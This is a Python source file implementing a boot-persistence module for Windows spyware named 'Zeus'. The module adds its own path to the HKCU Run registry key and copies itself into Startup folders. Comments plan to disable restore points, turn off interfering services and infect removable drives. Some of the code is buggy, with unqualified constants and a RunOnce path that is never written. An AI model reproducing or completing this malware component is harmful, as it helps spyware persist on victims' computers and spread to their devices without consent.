import platform
import os
import os.path
from shutil import copyfile
import winreg
from winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx

# Assuming Windows only

# TODO: Change to WindowsBootPersistHandler class

class BootPersistanceHandler:
    WINDOWS_START_UP_FOLDER_PREFIX = ""
    WINDOWS_START_UP_FOLDER_SUFFIX = r"\Start Menu\Programs\StartUp"
    WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start"

    START_MENU = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
    WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

    def isWindows():
        return (platform.system().lower() == "windows")

    def addSelfToSystemToBoot(self):
        if(platform.system().lower() == "windows"):
            # 1. Use registry
            self.implantToRegistry()

            # 2. Copy file manually
            # self.copyFilesManually()

            # 3. Disable restore points
            # 4. Disable windows services which can interfer propy injection to device
            # 5. Constantly check if removable devices is connected and if yes -
            # infect them as well (make spyware startup from removable device)

    def implantToRegistry(self):
        self.addSelfToRegistryPath(self.WINDOWS_REGISTRY_START_UP_PATH)
        self.addSelfToRegistryPath(self.WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH)

    def addSelfToRegistryPath(self, regPath):
        try:
            isKeyExistsInRegistry = False
            isKeyExistsInRegistry = self.checkRegistryKey(regPath, "Zeus", os.path.abspath(__file__))
            if isKeyExistsInRegistry:
                print(r"Zeus already installed in: %s!" % regPath)
            else:
                print(r"Implanting Zeus to windows registry to: %s" % regPath)

                didSaveKeySuccessfully = self.setRegistryValue("Zeus", os.path.abspath(__file__))
                if not didSaveKeySuccessfully:
                    print("Error adding Zeus to windows registry run key.")
        except EnvironmentError:
            print(EnvironmentError)

    def setRegistryValue(self, name, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.WINDOWS_REGISTRY_START_UP_PATH,
                                          0, winreg.KEY_WRITE)

            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except WindowsError:
            return False

    def checkRegistryKey(self, regPath, key, value):
        registryConnect = ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        zeusKey = winreg.OpenKey(registryConnect,  regPath)
        keyvalues = self.valuesToDict(zeusKey)
        zeusKey.Close()

        if "Zeus" in keyvalues:
            zeusPath = keyvalues['Zeus']
            if zeusPath == os.path.abspath(__file__):
                return True

        return  False

    def valuesToDict(self, key):
        """Convert a registry key's values to a dictionary."""
        dict = {}
        size = winreg.QueryInfoKey(key)[1]
        for i in range(size):
            data = winreg.EnumValue(key, i)
            dict[data[0]] = data[1]
        return dict

    def copyFilesManually(self):
        # Copy to 1st directory
        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_START_UP_FOLDER_SUFFIX)
        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

        if not os.path.isfile(filePath):
            copyfile(os.path.abspath(__file__), destinationFolder)

        # Copy to 2nd directory
        destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
        filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

        if not os.path.isfile(filePath):
            copyfile(os.path.abspath(__file__), destinationFolder)


    if(platform.system().lower() == "windows"):
        WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']